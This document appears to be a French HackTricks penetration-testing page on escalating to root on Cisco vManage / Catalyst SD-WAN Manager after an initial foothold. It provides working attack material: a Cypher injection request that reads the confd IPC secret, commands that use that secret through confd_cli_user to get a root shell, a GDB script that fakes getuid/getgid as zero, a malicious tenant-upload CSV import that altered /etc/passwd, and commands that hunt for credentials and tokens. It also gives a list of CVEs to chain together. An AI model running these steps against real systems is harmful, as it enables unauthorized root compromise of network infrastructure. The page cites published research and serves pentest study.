# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Une fois que vous avez obtenu une exécution de code sur Cisco vManage / *Catalyst SD-WAN Manager* en tant que `vmanage`, `netadmin` ou `vmanage-admin`, les surfaces locales de privesc les plus intéressantes sont généralement la pile CLI `confd`, l’helper `cmdptywrapper`, les API REST localhost et les handlers d’import/upload appartenant à root.

Si vous avez toujours besoin de l’**initial foothold** sur un controller, consultez d’abord la page dédiée au control-plane :

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triage local rapide
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` est lisible depuis votre point d'appui, le chemin 1 et le chemin 2 deviennent immédiatement exploitables. Si vous arrivez via une divulgation de fichiers à distance ou un webshell, inspectez également les éléments SSH de `vmanage-admin` et les gestionnaires d'upload de multitenancy ; des recherches récentes ont démontré que les deux constituaient des pivots viables.<sup>[[3]](#references)[[4]](#references)</sup>

## Chemin 1

L'évaluation de vManage par Synacktiv documente ce chemin vers un root-shell.<sup>[[5]](#references)</sup>

La [documentation de ConfD](http://66.218.245.39/doc/html/rn03re18.html) référencée par le rapport décrit l'authentification IPC ; son exemple vManage place le secret dans `/etc/confd/confd_ipc_secret` et indique qu'il est lisible par `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Parce que Neo4j s’exécute avec les privilèges de `vmanage` dans la configuration signalée, l’injection Cypher précédente peut lire le fichier secret.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` lui-même n'accepte pas d'arguments en ligne de commande ; il invoque `/usr/bin/confd_cli_user`. Le workflow décrit extrait cet helper lisible par root depuis le rootfs, le copie via `scp`, consulte son aide, définit `CONFD_IPC_ACCESS_FILE` et l'appelle avec `-U 0 -G 0` pour obtenir un shell root.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Chemin 2

Cette voie alternative est adaptée de la recherche de Walmart Global Tech sur vManage 19.2.2.<sup>[[6]](#references)</sup>

La voie de Synacktiv nécessite une copie de `/usr/bin/confd_cli_user`, lisible par root dans la configuration rapportée ; le rapport de Walmart modifie à la place les valeurs d'identité de `confd_cli` sous GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Le désassemblage du rapport montre que `confd_cli` récupère l'UID et le GID de l'appelant.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump montrant la récupération de l'UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Le même test a montré un `cmdptywrapper` appartenant à root recevant des valeurs explicites pour `-g` et `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Le chercheur a déduit que `confd_cli` transmet l’UID et le GID de l’utilisateur connecté à `cmdptywrapper`.<sup>[[6]](#references)</sup>

L’exécution directe de `cmdptywrapper` avec `-g 0 -u 0` a échoué, car le descripteur de fichier requis (`-i 1015` dans l’exemple) n’était pas disponible.<sup>[[6]](#references)</sup>

Comme `confd_cli` n’expose pas ces valeurs sous forme d’arguments, le rapport utilise GDB pour remplacer les valeurs de retour de `getuid()` et `getgid()` ; GDB était présent sur cet appliance.<sup>[[5]](#references)[[6]](#references)</sup>

Avec un accès à `vmanage`, le test pouvait lire `/etc/confd/confd_ipc_secret` ; le script suivant force les deux appels d’identité à retourner zéro.<sup>[[6]](#references)</sup>

Le script GDB utilisé dans le rapport est le suivant :<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
La sortie de console rapportée est :<sup>[[6]](#references)</sup>

<details>
<summary>Sortie de console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco a ensuite documenté un chemin local plus propre vers root dans son propre advisory pour [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). Un **attaquant authentifié disposant uniquement de privilèges en lecture seule** pouvait envoyer une requête forgée au manager CLI et obtenir root en raison d'une validation insuffisante des entrées.<sup>[[7]](#references)</sup>

D'un point de vue offensif, cet advisory et les recherches antérieures sur le CLI suggèrent le workflow suivant.<sup>[[6]](#references)[[7]](#references)</sup>

1. Une fois que vous disposez d'un *quelconque* foothold avec de faibles privilèges sur la machine, testez le service CLI local avant de passer au workflow plus lourd Path 1 / Path 2.
2. Réutilisez les artefacts de Path 2 pour trouver la trust boundary : `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considérez chaque champ transmis au backend CLI comme suspect : UID/GID, nom d'utilisateur, métadonnées du terminal, fichiers importés ou toute valeur ensuite consommée par un helper appartenant à root.
4. Si un utilisateur avec de faibles privilèges peut atteindre le socket CLI local et influencer ces champs, root peut n'être qu'à une requête forgée de distance.

Après avoir pris pied sur l'appliance, inspectez la chaîne CLI locale comme suit.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Cela transforme le bug de 2025 en une méthode de hunting réutilisable : recherchez des **CLI shims locaux qui collectent l'identité en userland et la transmettent à un wrapper privilégié**.<sup>[[6]](#references)[[7]](#references)</sup>

Ne confondez pas **CVE-2025-20122** avec la **CVE-2026-20122** ultérieure : le problème de 2025 est un bug *local* entre la CLI et root, tandis que celui de 2026 est une réécriture arbitraire de fichiers via une API *remote*, principalement utile pour établir un foothold, puis revenir à Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (API REST low-priv vers root - CVE-2026-20126)

L'avis de sécurité de Cisco publié en février 2026 décrit une autre classe utile de privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Un **attaquant local authentifié disposant de faibles privilèges** pouvait obtenir root en raison d'un mécanisme insuffisant d'authentification des utilisateurs dans l'API REST.<sup>[[1]](#references)</sup>

Cela est important, car le privesc de vManage ne se limite plus aux abus de `confd`/TTY ; après avoir obtenu un shell low-priv, recherchez également les éléments suivants.<sup>[[1]](#references)</sup>

- des endpoints d'API accessibles uniquement depuis localhost qui font excessivement confiance à l'appelant
- des tokens, cookies ou identifiants de service lisibles depuis le compte actuel
- des actions réservées à root exposées par des handlers `dataservice`/REST qui peuvent toujours être déclenchées localement

En pratique, une fois que vous disposez d'un shell en tant que `vmanage` ou qu'un autre utilisateur de service, l'abus de l'API locale peut être plus facile à automatiser que l'abus de la CLI interactive.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si le contexte de session local suffit pour accéder à des fonctionnalités REST privilégiées, préférez l'API path : il est plus facile à rejouer, à scripter et à chaîner avec des sessions web ou des API tokens volés.<sup>[[1]](#references)</sup>

## Path 5 (fichier crafted traité par root - CVE-2026-20245)

Un autre pattern récent est [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Un attaquant local disposant de privilèges `netadmin` pouvait uploader un **fichier crafted** que la CLI traitait ensuite de manière non sécurisée, permettant une command injection en tant que `root`.<sup>[[2]](#references)</sup>

Du point de vue de HackTricks, la technique intéressante est plus large que le CVE spécifique.<sup>[[2]](#references)</sup>

1. Énumérez tous les workflows CLI ou web qui acceptent un fichier : imports, bundles de diagnostic, templates, validators, backups, données de tenant, etc.
2. Suivez l'emplacement où le fichier uploadé est stocké et identifiez quel script ou binaire appartenant à `root` le consomme.
3. Testez si le nom du fichier, son contenu ou ses métadonnées parsées sont transmis à un moment quelconque à des commandes shell, des wrapper scripts ou des helpers de type `system()`.
4. Si vous pouvez déjà atteindre `netadmin` (identifiants valides, session volée ou chaîne d'auth-bypass), les bugs de traitement de fichiers constituent souvent le chemin le plus rapide vers `root`.

Google Cloud / Mandiant a ensuite montré un cas concret de cette classe de bugs exploité via le chemin d'importation multitenant.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Dans l’attaque observée, le fichier CSV spécialement conçu a modifié `/etc/passwd` et `/etc/shadow` afin de créer un compte UID 0 temporaire (`troot`). Cela rend les importateurs de type `tenant-upload` / `tenant-list` particulièrement intéressants : il ne s’agit pas seulement de fonctionnalités d’ingestion de données, mais de potentiels front-ends d’analyseurs s’exécutant avec les privilèges de root.<sup>[[4]](#references)</sup>

Un pattern de recherche rapide côté shell est :
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Cette classe de bugs se combine particulièrement bien avec des points d'appui distants qui accordent `netadmin`, mais pas `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Autres vulnérabilités récentes de vManage/Catalyst SD-WAN Manager à combiner

- **Info leak non authentifié (CVE-2026-20133)** – Particulièrement intéressant, car des recherches publiques ont montré qu'il pouvait exposer `confd_ipc_secret` ou la clé privée de `vmanage-admin`, transformant un bug de lecture en Path 1 ou en pivot NETCONF.<sup>[[3]](#references)</sup>
- **Écrasement arbitraire de fichiers via l'API authentifiée (CVE-2026-20122)** – Différent du bug CLI de 2025 mentionné plus haut ; VulnCheck l'a utilisé pour téléverser un webshell, ce qui rend alors immédiatement pertinents les chemins de privesc local de cette page.<sup>[[3]](#references)</sup>
- **XSS UI authentifiée (CVE-2024-20475)** – Un attaquant authentifié peut exécuter un script dans l'interface web d'un utilisateur affecté ; évaluez si le contexte de session obtenu expose des actions API/CLI permettant d'atteindre `vshell` ou l'un des chemins de privesc local mentionnés plus haut.<sup>[[9]](#references)</sup>
- **Contournement de l'authentification à distance vers `netadmin` (CVE-2026-20129)** – Très bon précurseur pour Path 5, car `netadmin` est exactement le niveau requis par le privesc via fichier forgé de 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Écriture arbitraire de fichiers authentifiée (CVE-2026-20262)** – Valeur offensive similaire à celle de CVE-2026-20122, mais via un chemin ultérieur de téléversement de l'interface web ; Cisco indique qu'un fichier créé ou écrasé par le bug pourrait ensuite être utilisé pour élever les privilèges vers root.<sup>[[10]](#references)</sup>
- **Downgrade pour ressusciter l'ancien privesc CLI (CVE-2022-20775)** – Les intrusions de 2026 ont montré que des attaquants peuvent revenir à une ancienne build SD-WAN vulnérable, exploiter l'ancien bug CLI permettant d'obtenir root, puis restaurer la version d'origine.<sup>[[8]](#references)</sup>
- **Contournement pré-auth du contrôle plane (CVE-2026-20182)** – Mieux documenté dans la page dédiée au contrôle plane SD-WAN ; il peut ajouter une clé SSH pour `vmanage-admin`, fournissant un accès NETCONF persistant pour les actions ultérieures sur le management plane.<sup>[[11]](#references)</sup>



## References

- [1] [Vulnérabilités de Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnérabilité d'escalade de privilèges authentifiée de Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager et Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck : Herding Cats - Vulnérabilités récentes de Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant : Exploitation zero-day d'une vulnérabilité (CVE-2026-20245) dans Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting de Cisco SD-WAN, partie 1 : attaque de vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking de Cisco SD-WAN vManage 19.2.2 — de CSRF à l'exécution de code à distance](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnérabilité d'escalade de privilèges de Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Exploitation active de Cisco Catalyst SD-WAN par UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Vulnérabilité Cross-Site Scripting de Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Vulnérabilité d'écriture arbitraire de fichiers de Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7 : CVE-2026-20182 - Contournement critique de l'authentification dans Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
